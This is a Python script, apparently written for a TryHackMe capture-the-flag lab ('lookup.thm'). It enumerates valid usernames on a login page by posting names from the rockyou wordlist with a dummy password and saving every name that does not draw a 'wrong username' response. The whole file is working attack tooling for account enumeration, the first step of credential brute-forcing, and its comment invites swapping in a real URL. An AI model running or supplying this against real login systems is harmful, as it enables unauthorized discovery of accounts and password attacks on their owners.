import re
import requests

def is_valid_format(username):
    """
    Local validation of username format.
    """
    pattern = r'^[a-zA-Z][a-zA-Z0-9_]{2,15}$'
    return bool(re.match(pattern, username))

def check_username_on_server(username, url, method="POST", field="username"):
    try:
        payload = {"username": username,
                   "password": "password"
                   } 
        headers = {'User-Agent': 'Mozilla/5.0'}
        
        if method.upper() == "POST":
            response = requests.post(url, data=payload, headers=headers)
        else:
            response = requests.get(url, params=payload, headers=headers)

        if "wrong username" in response.text.lower() or "wrong username or password" in response.text.lower():
            return False
        return True

    except requests.RequestException as e:
        print(f"Request error for {username}: {e}")
        return False

def validate_usernames_from_wordlist(wordlist_path, url, output_path="valid_usernames.txt"):
    with open(wordlist_path, "r") as infile, open(output_path, "w") as outfile:
        for line in infile:
            username = line.strip()
            if not is_valid_format(username):
                print(f"{username} (bad format)")
                continue
        
            print(f"Testing {username} ... ", end="")
            if check_username_on_server(username, url):
                print("Done")
                outfile.write(username + "\n")
            else:
                print("Invalid Username")

# Example usage
if __name__ == "__main__":
    target_url = "http://lookup.thm/login.php"  # Replace with real URL
    validate_usernames_from_wordlist("/usr/share/wordlists/rockyou.txt", target_url)
